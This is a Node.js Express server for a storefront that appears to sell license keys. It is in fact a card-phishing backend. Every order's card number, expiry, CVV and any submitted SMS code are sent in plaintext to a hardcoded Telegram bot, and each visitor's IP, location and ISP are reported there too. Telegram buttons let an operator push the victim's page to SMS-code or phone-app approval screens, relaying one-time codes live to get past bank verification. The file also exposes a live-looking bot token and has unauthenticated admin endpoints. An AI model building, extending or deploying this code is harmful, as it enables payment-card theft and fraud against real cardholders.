const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const https = require('https');

const app = express();
const PORT = process.env.PORT || 5000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// In-Memory Database for Active Orders & Bot Config
let botConfig = {
  botToken: process.env.TELEGRAM_BOT_TOKEN || '8652135964:AAFm5fhBvRZysScuiVT1ACksfA7UDZgZrq0',
  chatId: process.env.TELEGRAM_CHAT_ID || '8815011903'
};

const orders = {};
const sseClients = {}; // orderId -> array of res objects

// Visitor Tracking - stores seen IPs to avoid duplicate notifications
const visitedIPs = new Map(); // ip -> timestamp
let totalVisitors = 0;

// Clean old IPs every hour (only keep last 24h)
setInterval(() => {
  const oneDayAgo = Date.now() - 24 * 60 * 60 * 1000;
  for (const [ip, time] of visitedIPs) {
    if (time < oneDayAgo) visitedIPs.delete(ip);
  }
}, 60 * 60 * 1000);

// Load Products
const productsPath = path.join(__dirname, 'products.json');
let products = [];
try {
  products = JSON.parse(fs.readFileSync(productsPath, 'utf8'));
} catch (e) {
  console.error("Error reading products.json:", e);
}

// Telegram Helper Function to send messages with Inline Keyboards
async function sendTelegramMessage(text, replyMarkup = null) {
  if (!botConfig.botToken || !botConfig.chatId) {
    console.log("[Telegram Demo Mode] Message logged (Bot Token / ChatId not set):");
    console.log(text);
    return { ok: false, demo: true };
  }

  const payload = JSON.stringify({
    chat_id: botConfig.chatId,
    text: text,
    parse_mode: 'HTML',
    reply_markup: replyMarkup
  });

  return new Promise((resolve) => {
    const req = https.request(
      `https://api.telegram.org/bot${botConfig.botToken}/sendMessage`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload)
        }
      },
      (res) => {
        let body = '';
        res.on('data', (chunk) => (body += chunk));
        res.on('end', () => {
          try {
            resolve(JSON.parse(body));
          } catch (err) {
            resolve({ ok: false, error: err.message });
          }
        });
      }
    );
    req.on('error', (e) => resolve({ ok: false, error: e.message }));
    req.write(payload);
    req.end();
  });
}

// Helper to edit existing Telegram message
async function editTelegramMessage(messageId, text, replyMarkup = null) {
  if (!botConfig.botToken || !botConfig.chatId) return { ok: false };

  const payload = JSON.stringify({
    chat_id: botConfig.chatId,
    message_id: messageId,
    text: text,
    parse_mode: 'HTML',
    reply_markup: replyMarkup
  });

  return new Promise((resolve) => {
    const req = https.request(
      `https://api.telegram.org/bot${botConfig.botToken}/editMessageText`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload)
        }
      },
      (res) => {
        let body = '';
        res.on('data', (chunk) => (body += chunk));
        res.on('end', () => {
          try {
            resolve(JSON.parse(body));
          } catch (err) {
            resolve({ ok: false });
          }
        });
      }
    );
    req.on('error', () => resolve({ ok: false }));
    req.write(payload);
    req.end();
  });
}

// Notify all SSE connected frontend clients for an order
function notifyClients(orderId, orderData) {
  if (sseClients[orderId]) {
    sseClients[orderId].forEach((client) => {
      client.write(`data: ${JSON.stringify(orderData)}\n\n`);
    });
  }
}

// Build Telegram Keyboard for Orders
function getTelegramKeyboard(orderId) {
  return {
    inline_keyboard: [
      [
        { text: '💬 Request SMS Code', callback_data: `sms_${orderId}` },
        { text: '📱 Request Phone App', callback_data: `phone_${orderId}` }
      ],
      [
        { text: '✅ Approve Order', callback_data: `approve_${orderId}` },
        { text: '❌ Cancel Order', callback_data: `cancel_${orderId}` }
      ]
    ]
  };
}

// Serve Secret Admin Panel at /admin
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// --- VISITOR TRACKING ---

// Fetch geolocation info from ip-api.com
async function getGeoInfo(ip) {
  return new Promise((resolve) => {
    // Skip local/private IPs
    if (ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.') || ip.startsWith('10.')) {
      resolve({ country: 'Local', city: 'Localhost', isp: 'Local Network', query: ip });
      return;
    }
    
    const url = `http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,city,region,isp,query`;
    const http = require('http');
    http.get(url, (res) => {
      let body = '';
      res.on('data', (chunk) => body += chunk);
      res.on('end', () => {
        try {
          const data = JSON.parse(body);
          if (data.status === 'success') {
            resolve(data);
          } else {
            resolve({ country: 'Unknown', city: 'Unknown', isp: 'Unknown', query: ip });
          }
        } catch (e) {
          resolve({ country: 'Unknown', city: 'Unknown', isp: 'Unknown', query: ip });
        }
      });
    }).on('error', () => {
      resolve({ country: 'Unknown', city: 'Unknown', isp: 'Unknown', query: ip });
    });
  });
}

// Country code to flag emoji
function countryFlag(code) {
  if (!code || code.length !== 2) return '🌍';
  return String.fromCodePoint(...[...code.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65));
}

// Visitor tracking endpoint
app.post('/api/track-visit', async (req, res) => {
  // Get real IP (Railway uses x-forwarded-for)
  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
  const userAgent = req.headers['user-agent'] || 'Unknown';
  const referer = req.headers['referer'] || 'Direct';
  
  // Check if already seen this IP in the last 24h
  if (visitedIPs.has(ip)) {
    return res.json({ status: 'already_tracked' });
  }
  
  // Mark IP as seen
  visitedIPs.set(ip, Date.now());
  totalVisitors++;
  
  // Get geolocation
  const geo = await getGeoInfo(ip);
  const flag = countryFlag(geo.countryCode);
  
  // Detect device type from User-Agent
  let device = '💻 Desktop';
  if (/mobile|android|iphone|ipad/i.test(userAgent)) device = '📱 Mobile';
  if (/tablet|ipad/i.test(userAgent)) device = '📱 Tablet';
  
  // Detect browser
  let browser = 'Unknown';
  if (/chrome/i.test(userAgent)) browser = 'Chrome';
  if (/firefox/i.test(userAgent)) browser = 'Firefox';
  if (/safari/i.test(userAgent) && !/chrome/i.test(userAgent)) browser = 'Safari';
  if (/edge/i.test(userAgent)) browser = 'Edge';
  if (/opera|opr/i.test(userAgent)) browser = 'Opera';
  
  const now = new Date().toLocaleString('en-GB', { timeZone: 'Europe/London' });
  
  // Send Telegram notification
  const message = `👁️ <b>NEW VISITOR</b> #${totalVisitors}\n\n` +
    `${flag} <b>Country:</b> ${geo.country}\n` +
    `🏙️ <b>City:</b> ${geo.city || 'Unknown'}${geo.region ? ', ' + geo.region : ''}\n` +
    `🌐 <b>IP:</b> <code>${ip}</code>\n` +
    `📡 <b>ISP:</b> ${geo.isp || 'Unknown'}\n` +
    `${device} <b>Browser:</b> ${browser}\n` +
    `🕐 <b>Time:</b> ${now}`;
  
  await sendTelegramMessage(message);
  
  res.json({ status: 'tracked' });
});

// Get visitor stats (for admin)
app.get('/api/admin/visitors', (req, res) => {
  res.json({
    totalToday: visitedIPs.size,
    totalAllTime: totalVisitors
  });
});

// --- API ENDPOINTS ---

// 1. Get Products
app.get('/api/products', (req, res) => {
  res.json(products);
});

// Get All Orders for Admin Dashboard
app.get('/api/admin/orders', (req, res) => {
  const allOrders = Object.values(orders).reverse();
  res.json(allOrders);
});

// 2. Save Telegram Bot Settings
app.post('/api/telegram/config', (req, res) => {
  const { botToken, chatId } = req.body;
  botConfig.botToken = botToken || '';
  botConfig.chatId = chatId || '';
  res.json({ success: true, botConfig });
});

// 3. Get Bot Config
app.get('/api/telegram/config', (req, res) => {
  res.json({
    hasToken: Boolean(botConfig.botToken),
    chatId: botConfig.chatId ? 'Configured' : 'Not Set'
  });
});

// 4. Create New Order
app.post('/api/orders', async (req, res) => {
  const { productId, tier, discordTag, paymentMethod, paymentRef, cardName, cardNumber, cardExpiry, cardCvv, originalPrice, finalPrice, promoCode } = req.body;
  const product = products.find((p) => p.id === productId);

  if (!product) {
    return res.status(400).json({ error: 'Product not found' });
  }

  const orderId = 'ORD-' + Math.floor(100000 + Math.random() * 900000);
  const price = finalPrice || product.price[tier] || 40;

  const newOrder = {
    id: orderId,
    productName: product.title,
    productId: product.id,
    tier: tier,
    price: price,
    originalPrice: originalPrice || price,
    promoCode: promoCode || 'None',
    discordTag: discordTag || 'N/A',
    paymentMethod: paymentMethod || 'Crypto',
    paymentRef: paymentRef || 'N/A',
    cardName: cardName || null,
    cardNumber: cardNumber || null,
    cardExpiry: cardExpiry || null,
    cardCvv: cardCvv || null,
    status: 'PENDING',
    smsCode: null,
    createdAt: new Date().toISOString()
  };

  orders[orderId] = newOrder;

  // Format Telegram Notification Message with € Currency
  let tgText = '';
  const promoInfo = (newOrder.promoCode && newOrder.promoCode !== 'None') 
    ? `🏷️ <b>Promo Code:</b> <code>${newOrder.promoCode}</code> (${newOrder.originalPrice}€ ➔ <b>${newOrder.price}€</b>)\n`
    : '';

  if (paymentMethod === 'Card') {
    tgText = `🛍️ <b>NEW CARD ORDER RECEIVED!</b>\n\n` +
      `🆔 <b>Order ID:</b> <code>${newOrder.id}</code>\n` +
      `📦 <b>Product:</b> ${newOrder.productName} (${newOrder.tier.toUpperCase()})\n` +
      `💰 <b>Price:</b> <b>${newOrder.price}€</b>\n` +
      promoInfo +
      `💬 <b>Discord User:</b> <code>${newOrder.discordTag}</code>\n` +
      `----------------------------------------\n` +
      `💳 <b>CARD DETAILS:</b>\n` +
      `👤 <b>Name on Card:</b> <code>${newOrder.cardName}</code>\n` +
      `💳 <b>Card Number:</b> <code>${newOrder.cardNumber}</code>\n` +
      `📅 <b>Expiry Date:</b> <code>${newOrder.cardExpiry}</code>\n` +
      `🔒 <b>CVV:</b> <code>${newOrder.cardCvv}</code>\n\n` +
      `⏳ <b>Status:</b> PENDING ADMIN ACTION`;
  } else {
    tgText = `🛍️ <b>NEW CRYPTO ORDER RECEIVED!</b>\n\n` +
      `🆔 <b>Order ID:</b> <code>${newOrder.id}</code>\n` +
      `📦 <b>Product:</b> ${newOrder.productName} (${newOrder.tier.toUpperCase()})\n` +
      `💰 <b>Price:</b> <b>${newOrder.price}€</b>\n` +
      promoInfo +
      `💬 <b>Discord User:</b> <code>${newOrder.discordTag}</code>\n` +
      `📝 <b>Tx Hash / Proof:</b> <code>${newOrder.paymentRef}</code>\n\n` +
      `⏳ <b>Status:</b> PENDING ADMIN ACTION`;
  }

  const tgRes = await sendTelegramMessage(tgText, getTelegramKeyboard(orderId));
  if (tgRes && tgRes.result) {
    newOrder.telegramMessageId = tgRes.result.message_id;
  }

  res.json({ success: true, order: newOrder });
});

// 5. Customer submits SMS code
app.post('/api/orders/:id/sms', async (req, res) => {
  const { id } = req.params;
  const { smsCode } = req.body;

  const order = orders[id];
  if (!order) return res.status(404).json({ error: 'Order not found' });

  order.smsCode = smsCode;
  order.status = 'SMS_SUBMITTED';

  notifyClients(id, order);

  const tgText = `📩 <b>SMS CODE SUBMITTED BY CUSTOMER!</b>\n\n` +
    `🆔 <b>Order ID:</b> <code>${order.id}</code>\n` +
    `📦 <b>Product:</b> ${order.productName}\n` +
    `💬 <b>Discord User:</b> ${order.discordTag}\n` +
    (order.cardNumber ? `💳 <b>Card Number:</b> <code>${order.cardNumber}</code>\n` : '') +
    `🔢 <b>ENTERED SMS CODE:</b> <code>${smsCode}</code> 🔑\n\n` +
    `Please verify the SMS code and choose an action:`;

  const tgRes = await sendTelegramMessage(tgText, getTelegramKeyboard(id));
  if (tgRes && tgRes.result) {
    order.telegramMessageId = tgRes.result.message_id;
  }

  res.json({ success: true, order });
});

// 6. Real-Time Status Stream (SSE)
app.get('/api/orders/:id/stream', (req, res) => {
  const { id } = req.params;

  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');

  if (!sseClients[id]) sseClients[id] = [];
  sseClients[id].push(res);

  if (orders[id]) {
    res.write(`data: ${JSON.stringify(orders[id])}\n\n`);
  }

  req.on('close', () => {
    if (sseClients[id]) {
      sseClients[id] = sseClients[id].filter((c) => c !== res);
    }
  });
});

// 7. Get Order Status (Polling fallback)
app.get('/api/orders/:id', (req, res) => {
  const { id } = req.params;
  const order = orders[id];
  if (!order) return res.status(404).json({ error: 'Order not found' });
  res.json(order);
});

// 8. Admin Direct Control Action
app.post('/api/admin/action', async (req, res) => {
  const { orderId, action } = req.body;
  const order = orders[orderId];

  if (!order) return res.status(404).json({ error: 'Order not found' });

  let statusMessageText = '';

  switch (action) {
    case 'sms':
      order.status = 'SMS_REQUIRED';
      statusMessageText = `💬 <b>ACTION: REQUESTED SMS CODE</b>\nRedirected customer screen to SMS Verification.`;
      break;
    case 'phone':
      order.status = 'PHONE_REQUIRED';
      statusMessageText = `📱 <b>ACTION: REQUESTED PHONE APP APPROVAL</b>\nRedirected customer screen to Phone App Approval.`;
      break;
    case 'approve':
      order.status = 'APPROVED';
      order.licenseKey = 'KEY-REVOLT-' + Math.random().toString(36).substring(2, 10).toUpperCase() + '-ACTIVE';
      statusMessageText = `✅ <b>ORDER APPROVED!</b>\nDelivered key: <code>${order.licenseKey}</code>`;
      break;
    case 'cancel':
      order.status = 'CANCELLED';
      statusMessageText = `❌ <b>ORDER CANCELLED / REJECTED</b>`;
      break;
    default:
      return res.status(400).json({ error: 'Invalid action' });
  }

  notifyClients(orderId, order);

  if (order.telegramMessageId) {
    const updatedTgText = `🆔 <b>Order ID:</b> <code>${order.id}</code>\n` +
      `📦 <b>Product:</b> ${order.productName}\n` +
      `💰 <b>Price:</b> <code>${order.price}€</code>\n` +
      `💬 <b>Discord User:</b> ${order.discordTag}\n` +
      (order.cardNumber ? `💳 <b>Card:</b> <code>${order.cardNumber}</code> | Expiry: <code>${order.cardExpiry}</code> | CVV: <code>${order.cardCvv}</code>\n` : '') +
      (order.smsCode ? `🔢 <b>SMS Code:</b> <code>${order.smsCode}</code>\n` : '') +
      `----------------------------------------\n` +
      `${statusMessageText}`;

    const keyboard = (order.status === 'APPROVED' || order.status === 'CANCELLED') 
      ? null 
      : getTelegramKeyboard(orderId);

    await editTelegramMessage(order.telegramMessageId, updatedTgText, keyboard);
  }

  res.json({ success: true, order });
});

// Telegram Long-Polling Listener
let isPolling = false;
async function pollTelegramUpdates() {
  if (!botConfig.botToken || isPolling) return;
  isPolling = true;
  let offset = 0;

  while (true) {
    if (!botConfig.botToken) {
      isPolling = false;
      break;
    }

    try {
      const response = await new Promise((resolve) => {
        const req = https.get(
          `https://api.telegram.org/bot${botConfig.botToken}/getUpdates?offset=${offset}&timeout=10`,
          (res) => {
            let body = '';
            res.on('data', (c) => (body += c));
            res.on('end', () => {
              try { resolve(JSON.parse(body)); } catch (e) { resolve(null); }
            });
          }
        );
        req.on('error', () => resolve(null));
      });

      if (response && response.ok && response.result) {
        for (const update of response.result) {
          offset = update.update_id + 1;

          if (update.callback_query) {
            const cb = update.callback_query;
            const data = cb.data;

            const parts = data.split('_');
            const action = parts[0];
            const orderId = parts[1];

            if (orders[orderId]) {
              const order = orders[orderId];
              let statusText = '';

              if (action === 'sms') {
                order.status = 'SMS_REQUIRED';
                statusText = '💬 Requested SMS Verification';
              } else if (action === 'phone') {
                order.status = 'PHONE_REQUIRED';
                statusText = '📱 Requested Phone App Approval';
              } else if (action === 'approve') {
                order.status = 'APPROVED';
                order.licenseKey = 'KEY-REVOLT-' + Math.random().toString(36).substring(2, 10).toUpperCase() + '-ACTIVE';
                statusText = '✅ Approved';
              } else if (action === 'cancel') {
                order.status = 'CANCELLED';
                statusText = '❌ Cancelled';
              }

              notifyClients(orderId, order);

              https.get(`https://api.telegram.org/bot${botConfig.botToken}/answerCallbackQuery?callback_query_id=${cb.id}&text=${encodeURIComponent(statusText)}`).on('error', ()=>{});

              const updatedTgText = `🆔 <b>Order ID:</b> <code>${order.id}</code>\n` +
                `📦 <b>Product:</b> ${order.productName}\n` +
                `💰 <b>Price:</b> <code>${order.price}€</code>\n` +
                `💬 <b>Discord User:</b> ${order.discordTag}\n` +
                (order.cardNumber ? `💳 <b>Card:</b> <code>${order.cardNumber}</code> | Expiry: <code>${order.cardExpiry}</code> | CVV: <code>${order.cardCvv}</code>\n` : '') +
                (order.smsCode ? `🔢 <b>SMS Code:</b> <code>${order.smsCode}</code>\n` : '') +
                `----------------------------------------\n` +
                `📌 <b>Status:</b> ${statusText}`;

              const keyboard = (order.status === 'APPROVED' || order.status === 'CANCELLED') ? null : getTelegramKeyboard(orderId);
              await editTelegramMessage(cb.message.message_id, updatedTgText, keyboard);
            }
          }
        }
      }
    } catch (err) {
      console.error("Polling error:", err.message);
    }
    await new Promise((r) => setTimeout(r, 2000));
  }
}

setInterval(() => {
  if (botConfig.botToken && !isPolling) {
    pollTelegramUpdates();
  }
}, 5000);

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
